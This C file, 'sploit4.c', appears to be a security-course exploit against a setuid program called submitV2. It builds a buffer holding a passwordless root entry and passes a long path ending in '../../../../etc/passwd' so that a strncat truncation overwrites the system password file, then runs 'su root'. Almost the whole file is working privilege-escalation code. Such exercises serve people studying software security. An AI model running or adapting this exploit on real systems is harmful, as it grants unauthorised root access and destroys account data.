/*
 * sploit4.c
 * use the strncat to override unsafe varianle
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>



int main() {

    FILE *fp;
	unsigned char argbuf[4017]; 

	char *ptr;
    char newroot[] = "root::0:0:root:/root:/bin/bash\n";
    char user[] = "user::1000:1000::/home/user:/bin/sh\n";

    // create the argbuf
    memset(argbuf, ' ', sizeof(unsigned char)*4016);

    ptr = argbuf + 994;
    memcpy(ptr, user, strlen(user));
    ptr = argbuf + 1094;
    memcpy(ptr, newroot, strlen(newroot));

    system("mkdir -p /home/user/submit/user/etc/etc2");
    system("mkdir -p etc");

    if (chdir("/home/user/submit/user/etc/etc2") == -1)
    {
        printf("Failed to change working directory");
    }
    fp = fopen("/home/user/etc/passwd", "wb");
    fwrite(argbuf, 1, sizeof(argbuf), fp);
    fclose(fp);

    
    system("/usr/local/bin/submitV2 ./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../etc/passwd");
    system("su root");
	
	return 1;
}
